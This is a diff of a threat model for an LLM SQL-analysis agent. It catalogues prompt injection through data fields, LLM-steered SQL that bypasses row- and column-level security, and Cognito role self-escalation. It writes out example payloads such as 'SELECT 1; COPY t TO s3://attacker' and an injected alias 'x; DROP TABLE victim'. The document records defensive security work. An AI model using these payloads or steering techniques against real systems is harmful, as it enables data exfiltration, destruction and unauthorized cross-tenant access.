+**Statement**: A Data-borne prompt injector who cannot authenticate to the agent A field the agent reads that an outsider can write: ledger token names/contract data/log payloads, or attacker-influenceable CloudTrail fields. can places text that reads as an instruction where the analyst's query selects it, so it arrives in the model's context as a tool result., which leads to the model may be steered in the next turn: attempts to reach other tables are still bounded by governance, but the NARRATIVE the analyst reads is not — fabricated attribution or a missed hit.
+
+- **Prerequisites**: A field the agent reads that an outsider can write: ledger token names/contract data/log payloads, or attacker-influenceable CloudTrail fields.
+- **Action**: places text that reads as an instruction where the analyst's query selects it, so it arrives in the model's context as a tool result.
+- **Impact**: the model may be steered in the next turn: attempts to reach other tables are still bounded by governance, but the NARRATIVE the analyst reads is not — fabricated attribution or a missed hit.
+- **Impacted Assets**: A001, A005
+- **Tags**: prompt-injection, data-borne, residual
+- **Residual Risk Decision**: Accepted
+- **Residual Severity**: Medium
+- **Residual Likelihood**: Possible
+- **Residual Risk Rationale**: Data-borne prompt injection is structural to agentic data analysis: the model must read data to reason. Governance keeps it from widening data access and the pipeline from writing/host-reaching, so the realistic damage is a wrong narrative. The prompt now states rows are data, not instructions.
+- **Assessment State**: Current
+
+#### T10: Compromised upstream supplier (DuckDB extension repo or a Python dependency)
+
+**Statement**: A Compromised upstream supplier (DuckDB extension repo or a Python dependency) The engine runs INSTALL for httpfs/iceberg/ducklake/fts/aws/json at cold start unless pre-baked, and the runtime has egress to the repository. can serves a malicious build, or ships a malicious release of duckdb / sqlglot / strands / bedrock-agentcore., which leads to code execution inside the agent process, which holds the execution role and every governed result; every SQL-layer control is bypassed because the attacker is inside the process where they live.
+
+- **Prerequisites**: The engine runs INSTALL for httpfs/iceberg/ducklake/fts/aws/json at cold start unless pre-baked, and the runtime has egress to the repository.
+- **Action**: serves a malicious build, or ships a malicious release of duckdb / sqlglot / strands / bedrock-agentcore.
+- **Impact**: code execution inside the agent process, which holds the execution role and every governed result; every SQL-layer control is bypassed because the attacker is inside the process where they live.
+- **Impacted Assets**: A001
+- **Tags**: supply-chain, cold-start, residual
+- **Residual Risk Decision**: Accepted
+- **Residual Severity**: Medium
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: Low likelihood (signed extensions, HTTPS fetch), high consequence. Accepted for now with pre-baking/pinning tracked as a follow-up (M024). A runtime that INSTALLs at cold start is an avoidable standing dependency.
+- **Assessment State**: Current
+
+#### T11: Operator writing GOVERNANCE_POLICIES by hand
+
+**Statement**: A Operator writing GOVERNANCE_POLICIES by hand Policy configuration authored as JSON in an environment variable. can ships a malformed or incomplete table: a typo'd tenant:role key, a stale table name, allow_raw_paths with governed tables, or a row_filter that is not a single WHERE predicate., which leads to silently broader visibility than intended. Shape errors fail the process at import; omission (a mounted table the policy never names) now fails CLOSED under table-level deny-by-default rather than
+
+- **Prerequisites**: Policy configuration authored as JSON in an environment variable.
+- **Action**: ships a malformed or incomplete table: a typo'd tenant:role key, a stale table name, allow_raw_paths with governed tables, or a row_filter that is not a single WHERE predicate.
+- **Impact**: silently broader visibility than intended. Shape errors fail the process at import; omission (a mounted table the policy never names) now fails CLOSED under table-level deny-by-default rather than
+- **Impacted Assets**: A004
+- **Tags**: configuration, operator-error, fixed
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Possible
+- **Residual Risk Rationale**: Policy JSON and LABELS_PREFIX are validated at import, and omission now fails closed (deny-by-default + deny-all floor). Residual: a well-formed but semantically over-broad row_filter still governs as written; the audit trail gives the signal.
+- **Assessment State**: Current
+
+#### T12: Authenticated restricted analyst via LLM prompt injection
+
+**Statement**: A Authenticated restricted analyst via LLM prompt injection Valid restricted session; ability to ask arbitrary questions. can steers the LLM into SQL that reaches a governed table through a catalog-qualified alternate path (s3t/glue/dl), a CTE/alias trick, or an explicit denied column., which leads to cross-tenant row visibility or denied-column disclosure — defeat of the authorization layer.
+
+- **Prerequisites**: Valid restricted session; ability to ask arbitrary questions.
+- **Action**: steers the LLM into SQL that reaches a governed table through a catalog-qualified alternate path (s3t/glue/dl), a CTE/alias trick, or an explicit denied column.
+- **Impact**: cross-tenant row visibility or denied-column disclosure — defeat of the authorization layer.
+- **Impacted Assets**: A001
+- **Tags**: core-threat, rls-cls, resolved
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: AST rewrite guards every governed-table reference through raw/s3t/glue/dl; denied-column selection is a clean rejection. Residual bounded by fail-closed parsing and a read-only worst case.
+- **Assessment State**: Current
+
+#### T13: Authenticated restricted analyst steering the model
+
+**Statement**: A Authenticated restricted analyst steering the model Knowledge that an embedded engine executes generated SQL. can names a CTE, temp table/view or alias after a governed table so the base-table reference looks local and the rewrite skips it., which leads to the real governed table is read unguarded (RLS and CLS both bypassed); reproduced before the fix as a junior reading three exchanges' KYC PII.
+
+- **Prerequisites**: Knowledge that an embedded engine executes generated SQL.
+- **Action**: names a CTE, temp table/view or alias after a governed table so the base-table reference looks local and the rewrite skips it.
+- **Impact**: the real governed table is read unguarded (RLS and CLS both bypassed); reproduced before the fix as a junior reading three exchanges' KYC PII.
+- **Impacted Assets**: A001
+- **Tags**: local-name-shadow, resolved
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: A local name reusing a governed table's name is refused (nine adversarial shapes), so a governed name always denotes the governed table.
+- **Assessment State**: Current
+
+#### T14: Authenticated restricted analyst steering the model
+
+**Statement**: A Authenticated restricted analyst steering the model The read-only gate accepts EXPLAIN as a read keyword; sqlglot models EXPLAIN/SHOW <table> as an opaque Command with no table nodes. can submits EXPLAIN ANALYZE SELECT ... FROM <governed>, which the rewrite loop found nothing to guard and passed through., which leads to the ungoverned inner query really executes and reports true cardinalities of denied rows in the plan — a side-channel oracle.
+
+- **Prerequisites**: The read-only gate accepts EXPLAIN as a read keyword; sqlglot models EXPLAIN/SHOW <table> as an opaque Command with no table nodes.
+- **Action**: submits EXPLAIN ANALYZE SELECT ... FROM <governed>, which the rewrite loop found nothing to guard and passed through.
+- **Impact**: the ungoverned inner query really executes and reports true cardinalities of denied rows in the plan — a side-channel oracle.
+- **Impacted Assets**: A001
+- **Tags**: opaque-statement, resolved
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: Statement-root allowlist rejects opaque Command shapes for restricted principals; EXPLAIN ANALYZE no longer executes ungoverned. Regression-tested.
+- **Assessment State**: Current
+
+#### T15: Any principal via model-generated SQL
+
+**Statement**: A Any principal via model-generated SQL The gate classifies on the leading keyword. can smuggles a write or exfiltration behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker'., which leads to persistent write, exfiltration via COPY TO, or session-state destruction despite the read-only gate.
+
+- **Prerequisites**: The gate classifies on the leading keyword.
+- **Action**: smuggles a write or exfiltration behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker'.
+- **Impact**: persistent write, exfiltration via COPY TO, or session-state destruction despite the read-only gate.
+- **Impacted Assets**: A001, A005
+- **Tags**: multi-statement, resolved
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: Single-statement rule uses the engine's own parser; end-to-end proof the second statement never reaches the engine; READ_ONLY attaches and no write IAM bound any residual.
+- **Assessment State**: Current
+
+#### T16: Authenticated restricted analyst via LLM prompt injection
+
+**Statement**: A Authenticated restricted analyst via LLM prompt injection DuckDB exposes dozens of file-reading table functions and adds more each release. can uses a file-reading function NOT on a name denylist — parquet_scan, read_csv_auto, read_json, read_text, glob — to read S3 paths directly., which leads to full raw-path read of any data the execution role can reach — complete RLS/CLS bypass.
+
+- **Prerequisites**: DuckDB exposes dozens of file-reading table functions and adds more each release.
+- **Action**: uses a file-reading function NOT on a name denylist — parquet_scan, read_csv_auto, read_json, read_text, glob — to read S3 paths directly.
+- **Impact**: full raw-path read of any data the execution role can reach — complete RLS/CLS bypass.
+- **Impacted Assets**: A001
+- **Tags**: raw-path, allowlist, resolved
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: AST-shape allowlist rejects new file functions by default; cloud-verified. Additions to the generator exception require explicit justification.
+- **Assessment State**: Current
+
+#### T17: Caller presenting blank, missing or unknown identity claims
+
+**Statement**: A Caller presenting blank, missing or unknown identity claims The authorization layer is claim-driven; a default role is applied when claims are absent. can invokes with no/blank/unknown-tenant claims, relying on the default role., which leads to if the default were permissive (it was ops:admin), an unauthenticated-looking request becomes the unrestricted principal.
+
+- **Prerequisites**: The authorization layer is claim-driven; a default role is applied when claims are absent.
+- **Action**: invokes with no/blank/unknown-tenant claims, relying on the default role.
+- **Impact**: if the default were permissive (it was ops:admin), an unauthenticated-looking request becomes the unrestricted principal.
+- **Impacted Assets**: A001, A004
+- **Tags**: deny-all-floor, resolved
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: The deny-all floor is the default and where blank/unknown claims resolve; the entrypoint refuses before the model runs. Local CLI must name the principal explicitly.
+- **Assessment State**: Current
+
+#### T18: Authenticated restricted analyst at the identity source
+
+**Statement**: A Authenticated restricted analyst at the identity source Valid Cognito login; the app client could write every attribute including custom ones. can calls UpdateUserAttributes with its own token to set custom:role=admin, then re-authenticates., which leads to total privilege escalation through the identity source: a junior becomes the unrestricted ops:admin principal.
+
+- **Prerequisites**: Valid Cognito login; the app client could write every attribute including custom ones.
+- **Action**: calls UpdateUserAttributes with its own token to set custom:role=admin, then re-authenticates.
+- **Impact**: total privilege escalation through the identity source: a junior becomes the unrestricted ops:admin principal.
+- **Impacted Assets**: A002, A001
+- **Tags**: identity-self-service, cognito, resolved
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: custom:tenant/custom:role are READ-only on the app client (verified NotAuthorizedException); role assignment is an operator action. Residual: an operator with Cognito admin rights can still misassign (same class as IAM role assignment).
+- **Assessment State**: Current
+
+#### T19: Unauthenticated or token-forging caller at the runtime endpoint
+
+**Statement**: A Unauthenticated or token-forging caller at the runtime endpoint Network reach to the public AgentCore runtime endpoint. can invokes with no token, a forged token, an expired token, or a token for a different audience., which leads to unauthenticated agent invocation — data access and Bedrock/S3 cost burn — if the platform did not reject it.
+
+- **Prerequisites**: Network reach to the public AgentCore runtime endpoint.
+- **Action**: invokes with no token, a forged token, an expired token, or a token for a different audience.
+- **Impact**: unauthenticated agent invocation — data access and Bedrock/S3 cost burn — if the platform did not reject it.
+- **Impacted Assets**: A002
+- **Tags**: authn, jwt, resolved-platform
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Possible
+- **Residual Risk Rationale**: Platform-enforced pre-code validation (401/403 verified). Residual: stolen VALID tokens are T026; the authorizer is AWS-managed and out of sample scope.
+- **Assessment State**: Current
+
+#### T20: Compromised or malicious calling application on the SigV4 path
+
+**Statement**: A Compromised or malicious calling application on the SigV4 path IAM permission to invoke a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity. can asserts an arbitrary tenant:role in the runtime User-Id header or payload identity object., which leads to full dataset visibility for any principal the caller invents — authorization is only as strong as the weakest accepted identity source.
+
+- **Prerequisites**: IAM permission to invoke a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity.
+- **Action**: asserts an arbitrary tenant:role in the runtime User-Id header or payload identity object.
+- **Impact**: full dataset visibility for any principal the caller invents — authorization is only as strong as the weakest accepted identity source.
+- **Impacted Assets**: A002
+- **Tags**: identity-assertion, trust-assumption, accepted
+- **Residual Risk Decision**: Accepted
+- **Residual Severity**: Medium
+- **Residual Likelihood**: Possible
+- **Residual Risk Rationale**: Documented trust assumption on the local/CLI SigV4 path only: the caller is IAM-authenticated infrastructure trusted to assert identity. The deployed path uses the JWT authorizer, where these sources are unreachable pre-code.
+- **Assessment State**: Current
+
+#### T21: Concurrent tool calls inside one session (Strands thread execution)
+
+**Statement**: A Concurrent tool calls inside one session (Strands thread execution) The LLM issues multiple run_sql calls in one message; a shared DuckDB connection. can races execute/fetch pairs (or the schema probe vs a query) on the shared connection., which leads to results attributed to the wrong query — an integrity glitch (cloud symptom: count(*) returning 0 rows).
+
+- **Prerequisites**: The LLM issues multiple run_sql calls in one message; a shared DuckDB connection.
+- **Action**: races execute/fetch pairs (or the schema probe vs a query) on the shared connection.
+- **Impact**: results attributed to the wrong query — an integrity glitch (cloud symptom: count(*) returning 0 rows).
+- **Impacted Assets**: A005
+- **Tags**: concurrency, resolved
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: conn_lock serializes execute+fetch and the schema probe/session lister; single-principal-per-session makes the worst case an integrity glitch, not cross-principal leakage. Regression-tested.
+- **Assessment State**: Current
+
+#### T22: Authenticated restricted analyst
+
+**Statement**: A Authenticated restricted analyst SQL whose hostile table alias is interpolated into the guard subquery the rewrite builds. can supplies an alias like `x; DROP TABLE victim` hoping the rewrite emits it as free SQL., which leads to an attacker statement appended after the guard would reach the engine.
+
+- **Prerequisites**: SQL whose hostile table alias is interpolated into the guard subquery the rewrite builds.
+- **Action**: supplies an alias like `x; DROP TABLE victim` hoping the rewrite emits it as free SQL.
+- **Impact**: an attacker statement appended after the guard would reach the engine.
+- **Impacted Assets**: A001
+- **Tags**: guard-alias-injection, resolved
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: The alias is attached via the AST (quoted when unsafe) and only the subquery node is extracted, so a hostile alias is a single inert statement. Verified: victim survives, one statement.
+- **Assessment State**: Current
+
+#### T23: Authenticated restricted analyst
+
+**Statement**: A Authenticated restricted analyst Valid restricted session; a CLS policy denies a column. can infers denied-column values via aggregate predicates on permitted expressions, or timing., which leads to partial disclosure of denied-column information without direct selection — an industry-wide limitation of query-rewrite RLS/CLS.
+
+- **Prerequisites**: Valid restricted session; a CLS policy denies a column.
+- **Action**: infers denied-column values via aggregate predicates on permitted expressions, or timing.
+- **Impact**: partial disclosure of denied-column information without direct selection — an industry-wide limitation of query-rewrite RLS/CLS.
+- **Impacted Assets**: A001
+- **Tags**: side-channel, inference, accepted
 - **Residual Risk Decision**: Accepted
 - **Residual Severity**: Low
 - **Residual Likelihood**: Possible
-- **Residual Risk Rationale**: Inference/side channels against RLS/CLS are an industry-wide limitation of query-rewrite governance (shared with BI-tool row-level security and warehouse RLS). One CONCRETE oracle in this class - EXPLAIN ANALYZE reporting true cardinalities of denied rows - was a real defect, not an accepted residual, and is closed by M017. What remains accepted is aggregate-inference and timing, with guidance to use physical separation for high-sensitivity multi-tenant data. Sample dataset is public/synthetic.
+- **Residual Risk Rationale**: Aggregate/timing inference against denied columns is an industry-wide limitation of query-rewrite governance. The one concrete oracle (EXPLAIN ANALYZE) is closed (T014). Sample data is public/synthetic; production guidance is physical separation.
 - **Assessment State**: Current
 
-#### T10: Restricted end user
+#### T24: Authenticated restricted analyst reading the streamed trace
 
-**Statement**: A Restricted end user Valid session; engine executes governed but expensive SQL; SSE keeps the session streaming can Asks questions that generate pathological SQL (full-history globs, huge sorts, cross joins) to exhaust the session's memory/CPU, or holds many concurrent streaming sessions, which leads to Own-session OOM/slowdown only - one session = one microVM; no shared-service blast radius. Repeated invocations still incur S3 request and Bedrock token costs
+**Statement**: A Authenticated restricted analyst reading the streamed trace The SSE trace emits govern envelopes incl. the rewritten SQL and rls[]/cls[] metadata for the principal's OWN policy. can reads the trace to learn the exact RLS predicates and denied-column names applied to them, then probes the policy's edges., which leads to disclosure of the principal's own policy internals — reconnaissance, the same information the clean rejection conveys; no other tenant's data.
 
-- **Prerequisites**: Valid session; engine executes governed but expensive SQL; SSE keeps the session streaming
-- **Action**: Asks questions that generate pathological SQL (full-history globs, huge sorts, cross joins) to exhaust the session's memory/CPU, or holds many concurrent streaming sessions
-- **Impact**: Own-session OOM/slowdown only - one session = one microVM; no shared-service blast radius. Repeated invocations still incur S3 request and Bedrock token costs
-- **Tags**: resource-exhaustion, cost
-- **Residual Risk Decision**: Mitigated
+- **Prerequisites**: The SSE trace emits govern envelopes incl. the rewritten SQL and rls[]/cls[] metadata for the principal's OWN policy.
+- **Action**: reads the trace to learn the exact RLS predicates and denied-column names applied to them, then probes the policy's edges.
+- **Impact**: disclosure of the principal's own policy internals — reconnaissance, the same information the clean rejection conveys; no other tenant's data.
+- **Impacted Assets**: A004
+- **Tags**: trace, policy-disclosure, accepted
+- **Residual Risk Decision**: Accepted
 - **Residual Severity**: Low
 - **Residual Likelihood**: Likely
-- **Residual Risk Rationale**: Blast radius is structurally one microVM; envelope caps memory with spill. Cost exposure is the customer's own account and bounded by their throttles/budgets. Remaining: per-request cost, standard for any LLM app.
+- **Residual Risk Rationale**: Deliberate transparency: the trace shows the principal only their OWN policy application, the same information the clean rejection conveys, never another tenant's data. A single filter point exists for opacity-preferring deployments.
 - **Assessment State**: Current
 
-#### T11: Operator error (customer deployer)
+#### T25: Sample consumer (customer engineer) reusing the governance module
 
-**Statement**: A Operator error (customer deployer) Operator writes GOVERNANCE_POLICIES JSON by hand can Ships a malformed policy (typo in tenant:role key, empty tables map with allow_raw_paths true, wrong row_filter SQL) that silently grants broader visibility than intended, which leads to Unintended data exposure to restricted principals; worst case default role is unrestricted
+**Statement**: A Sample consumer (customer engineer) reusing the governance module Customer lifts governance into a production service serving MULTIPLE principals concurrently in one process. can reuses the module-level active-role slot — valid only under AgentCore's one-session-one-microVM model., which leads to cross-principal policy application: user A's query rewritten under user B's policy.
 
-- **Prerequisites**: Operator writes GOVERNANCE_POLICIES JSON by hand
-- **Action**: Ships a malformed policy (typo in tenant:role key, empty tables map with allow_raw_paths true, wrong row_filter SQL) that silently grants broader visibility than intended
-- **Impact**: Unintended data exposure to restricted principals; worst case default role is unrestricted
-- **Impacted Assets**: A004
-- **Tags**: misconfiguration, policy
-- **Residual Risk Decision**: Accepted
-- **Residual Severity**: Low
-- **Residual Likelihood**: Possible
-- **Residual Risk Rationale**: Policy authoring remains the operator's responsibility, but the two fail-open defaults are gone: the default role is the deny-all floor rather than ops:admin (M019), and the policy table is validated at load - key shape, known fields, bare identifiers, one-predicate row_filter, no allow_raw_paths-with-governed-tables (M021). LABELS_PREFIX, which decides what a sanctions screen compares against, is validated and bucket-restricted (M022). Residual: a semantically wrong but well-formed policy (e.g. an over-broad row_filter) still governs as written; the governed trace (M011) gives the audit signal.
-- **Assessment State**: Current
-
-#### T12: Restricted end user
-
-**Statement**: A Restricted end user Valid restricted session; DESCRIBE-based schema probe active for CLS intersection can Exploits the schema-probe cache: if probe fails open or cache poisons across principals, EXCLUDE lists could shrink, which leads to Denied columns leak through a stale or failed schema probe
-
-- **Prerequisites**: Valid restricted session; DESCRIBE-based schema probe active for CLS intersection
-- **Action**: Exploits the schema-probe cache: if probe fails open or cache poisons across principals, EXCLUDE lists could shrink
-- **Impact**: Denied columns leak through a stale or failed schema probe
+- **Prerequisites**: Customer lifts governance into a production service serving MULTIPLE principals concurrently in one process.
+- **Action**: reuses the module-level active-role slot — valid only under AgentCore's one-session-one-microVM model.
+- **Impact**: cross-principal policy application: user A's query rewritten under user B's policy.
 - **Impacted Assets**: A001
-- **Tags**: schema-probe, cache
-- **Residual Risk Decision**: Mitigated
-- **Residual Severity**: Low
-- **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: Probe failure keeps the full denylist (fail-closed); cache is per-session/per-principal by construction. Residual only if the customer redeploys the module multi-principal - covered by T015.
-- **Assessment State**: Current
-
-#### T13: Any principal via agent-generated SQL
-
-**Statement**: A Any principal via agent-generated SQL Gate must block writes for the model to hold can Single-statement SQL attempts persistent writes (CREATE TABLE non-temp, INSERT, COPY TO s3://attacker-bucket), ATTACH of foreign databases, or extension installs at query time, which leads to Data exfiltration to external targets or persistence beyond the session
-
-- **Prerequisites**: Gate must block writes for the model to hold
-- **Action**: Single-statement SQL attempts persistent writes (CREATE TABLE non-temp, INSERT, COPY TO s3://attacker-bucket), ATTACH of foreign databases, or extension installs at query time
-- **Impact**: Data exfiltration to external targets or persistence beyond the session
-- **Impacted Assets**: A001
-- **Tags**: exfiltration, write-gate
-- **Residual Risk Decision**: Mitigated
-- **Residual Severity**: Low
-- **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: Three independent layers: statement gate allowlist, READ_ONLY attaches, IAM role without write permissions. COPY TO and ATTACH explicitly rejected with tests.
-- **Assessment State**: Current
-
-#### T14: Concurrent tool calls within one session (Strands thread execution)
-
-**Statement**: A Concurrent tool calls within one session (Strands thread execution) LLM issues multiple run_sql calls in one message; shared DuckDB connection can Race between execute/fetch pairs or between governance schema probe and query execution corrupts result attribution, which leads to Results attributed to the wrong query - integrity issue; in a multi-principal design (NOT this sample: one session = one principal) it would be cross-principal leakage
-
-- **Prerequisites**: LLM issues multiple run_sql calls in one message; shared DuckDB connection
-- **Action**: Race between execute/fetch pairs or between governance schema probe and query execution corrupts result attribution
-- **Impact**: Results attributed to the wrong query - integrity issue; in a multi-principal design (NOT this sample: one session = one principal) it would be cross-principal leakage
-- **Tags**: concurrency, race
-- **Residual Risk Decision**: Mitigated
-- **Residual Severity**: Low
-- **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: _conn_lock serializes execute+fetch atomically incl. the schema probe; the async-generator tool preserves lock semantics via asyncio.to_thread; regression test exists. Single-principal-per-session makes the worst case an integrity glitch, not cross-principal leakage.
-- **Assessment State**: Current
-
-#### T15: Sample consumer (customer engineer)
-
-**Statement**: A Sample consumer (customer engineer) Customer lifts data_agent/governance/ into a production multi-principal service can Reuses the module-level active-role slot in a process serving MULTIPLE principals concurrently - a design valid only under AgentCore's one-session-one-microVM model, which leads to Cross-principal policy application: user A's query rewritten under user B's policy
-
-- **Prerequisites**: Customer lifts data_agent/governance/ into a production multi-principal service
-- **Action**: Reuses the module-level active-role slot in a process serving MULTIPLE principals concurrently - a design valid only under AgentCore's one-session-one-microVM model
-- **Impact**: Cross-principal policy application: user A's query rewritten under user B's policy
-- **Impacted Assets**: A001
-- **Tags**: misuse-of-sample, documentation
+- **Tags**: misuse-of-sample, documentation, accepted
 - **Residual Risk Decision**: Accepted
 - **Residual Severity**: High
 - **Residual Likelihood**: Possible
-- **Residual Risk Rationale**: Misuse-of-sample risk: the module-level active-role slot is only safe under one-session-one-principal (AgentCore microVM). Cannot be closed by code in a sample - the misuse happens in the consumer's fork. Controlled by prominent documentation (module docstring + README + this model). Accepted with the HIGH residual kept visible on purpose.
+- **Residual Risk Rationale**: Misuse-of-sample: the module-level active-role slot is safe only under one-session-one-principal (AgentCore microVM). Cannot be closed by code in a sample; controlled by prominent documentation. HIGH residual kept visible on purpose.
 - **Assessment State**: Current
 
-#### T16: Restricted end user observing the streaming trace
+#### T26: Attacker with access to the analyst's machine, or a stolen token
 
-**Statement**: A Restricted end user observing the streaming trace Valid restricted session; the SSE trace emits gate/govern/cost/execute envelopes incl. the rewritten SQL and policy metadata (rls[]/cls[]) can Reads the trace to learn the exact RLS predicates, denied-column names, and policy structure applied to their principal, then uses that map to probe the policy's edges, which leads to Disclosure of governance-policy internals (filter predicates, denied column names) to the governed principal - reconnaissance that sharpens bypass attempts; no direct data disclosure
+**Statement**: A Attacker with access to the analyst's machine, or a stolen token The UI holds the ID token in session state and the app client secret in a process env var; demo users ship with a documented password. can steals the bearer token (valid to expiry) or logs in with unrotated default credentials., which leads to principal impersonation for the token lifetime, bounded to the victim's own role (claims are no longer self-writable).
 
-- **Prerequisites**: Valid restricted session; the SSE trace emits gate/govern/cost/execute envelopes incl. the rewritten SQL and policy metadata (rls[]/cls[])
-- **Action**: Reads the trace to learn the exact RLS predicates, denied-column names, and policy structure applied to their principal, then uses that map to probe the policy's edges
-- **Impact**: Disclosure of governance-policy internals (filter predicates, denied column names) to the governed principal - reconnaissance that sharpens bypass attempts; no direct data disclosure
-- **Impacted Assets**: A004
-- **Tags**: trace, sse, policy-disclosure, new-in-v2
+- **Prerequisites**: The UI holds the ID token in session state and the app client secret in a process env var; demo users ship with a documented password.
+- **Action**: steals the bearer token (valid to expiry) or logs in with unrotated default credentials.
+- **Impact**: principal impersonation for the token lifetime, bounded to the victim's own role (claims are no longer self-writable).
+- **Impacted Assets**: A002, A003
+- **Tags**: default-credentials, accepted
 - **Residual Risk Decision**: Accepted
+- **Residual Severity**: Medium
+- **Residual Likelihood**: Possible
+- **Residual Risk Rationale**: Bearer-token theft is inherent to token auth; lifetime bounds exposure and a stolen session cannot be escalated beyond the victim's role (claims read-only). Demo credentials are rotate-before-exposing; MFA deliberately off for demo. Analyst-host security is out of scope for a sample.
+- **Assessment State**: Current
+
+#### T27: Authenticated restricted analyst
+
+**Statement**: A Authenticated restricted analyst The engine executes governed but expensive SQL in the session's microVM. can asks questions generating pathological SQL (huge sorts, cross joins) to exhaust the session's memory/CPU., which leads to own-session OOM/slowdown only — one session = one microVM, no shared-service blast radius; per-request S3/Bedrock cost remains.
+
+- **Prerequisites**: The engine executes governed but expensive SQL in the session's microVM.
+- **Action**: asks questions generating pathological SQL (huge sorts, cross joins) to exhaust the session's memory/CPU.
+- **Impact**: own-session OOM/slowdown only — one session = one microVM, no shared-service blast radius; per-request S3/Bedrock cost remains.
+- **Impacted Assets**: A001
+- **Tags**: cost, resolved
+- **Residual Risk Decision**: Mitigated
 - **Residual Severity**: Low
 - **Residual Likelihood**: Likely
-- **Residual Risk Rationale**: Deliberate transparency tradeoff: the trace shows the principal only their OWN policy application - the same information the clean rejection message conveys - never another tenant's policy or data. Deployments preferring opacity have a single filter point (_map_event). Demo legibility is the sample's purpose.
-- **Assessment State**: Current
-
-#### T17: Restricted end user via LLM prompt injection
-
-**Statement**: A Restricted end user via LLM prompt injection Valid restricted session; the governance rewrite is driven by a sqlglot parse and the read-only gate accepts EXPLAIN as a read keyword can Submits a statement shape sqlglot cannot model (EXPLAIN, EXPLAIN ANALYZE, SHOW <table>), which parses to an opaque Command node carrying no table references, so the rewrite loop finds nothing to guard and returns the statement untouched, which leads to Ungoverned execution of the inner query: EXPLAIN ANALYZE really runs it and reports true cardinalities of policy-denied rows in the query plan - a side-channel oracle over denied data, and a passthrough for any shape that returns rows
-
-- **Prerequisites**: Valid restricted session; the governance rewrite is driven by a sqlglot parse and the read-only gate accepts EXPLAIN as a read keyword
-- **Action**: Submits a statement shape sqlglot cannot model (EXPLAIN, EXPLAIN ANALYZE, SHOW <table>), which parses to an opaque Command node carrying no table references, so the rewrite loop finds nothing to guard and returns the statement untouched
-- **Impact**: Ungoverned execution of the inner query: EXPLAIN ANALYZE really runs it and reports true cardinalities of policy-denied rows in the query plan - a side-channel oracle over denied data, and a passthrough for any shape that returns rows
-- **Impacted Assets**: A001
-- **Tags**: authz-bypass, parser-coverage, fail-open, phase-7.5-round-2
-- **Residual Risk Decision**: Mitigated
-- **Residual Severity**: Low
-- **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: Statement-shape allowlist on the parsed root (M017) rejects opaque shapes for restricted principals; regression tests cover EXPLAIN, EXPLAIN ANALYZE and SHOW <table>, and cloud acceptance confirms no plan is emitted. Residual: a NEW syntax that sqlglot models as a governable root but DuckDB interprets differently - bounded by the read-only gate and the same fail-closed parse as T002.
-- **Assessment State**: Current
-
-#### T18: Restricted end user (authenticated, low privilege) at the identity source
-
-**Statement**: A Restricted end user (authenticated, low privilege) at the identity source Valid Cognito login; the app client carries no explicit attribute permissions, so it may write every attribute including custom ones; the agent's authorization is entirely claim-driven can Calls UpdateUserAttributes with their own access token to set custom:role=admin (and custom:tenant=ops), then re-authenticates to obtain an ID token carrying the escalated claims, which leads to Total privilege escalation: the authorization layer honours the rewritten claims, so a junior analyst becomes the unrestricted ops:admin principal - every row, every column, raw path access, across all four access methods
-
-- **Prerequisites**: Valid Cognito login; the app client carries no explicit attribute permissions, so it may write every attribute including custom ones; the agent's authorization is entirely claim-driven
-- **Action**: Calls UpdateUserAttributes with their own access token to set custom:role=admin (and custom:tenant=ops), then re-authenticates to obtain an ID token carrying the escalated claims
-- **Impact**: Total privilege escalation: the authorization layer honours the rewritten claims, so a junior analyst becomes the unrestricted ops:admin principal - every row, every column, raw path access, across all four access methods
-- **Impacted Assets**: A001, A002, A003
-- **Tags**: privilege-escalation, identity-source, cognito, phase-7.5-round-2
-- **Residual Risk Decision**: Mitigated
-- **Residual Severity**: Low
-- **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: App client attribute permissions make custom:tenant/custom:role read-only (M020); verified live against the deployed pool - UpdateUserAttributes returns NotAuthorizedException and claims are unchanged after re-login. Residual: an operator with Cognito admin rights can still misassign roles (same class as IAM role assignment, A007), and MFA is deliberately OFF in this demo, so a stolen password is a stolen identity (T008).
+- **Residual Risk Rationale**: Blast radius is structurally one microVM; the memory envelope turns exhaustion into slower-not-dead. Cost exposure is the customer's own account, bounded by their throttles; per-request cost is standard for any LLM app.
 - **Assessment State**: Current
 
 ## Mitigations
 
 ### Resolved Mitigations
 
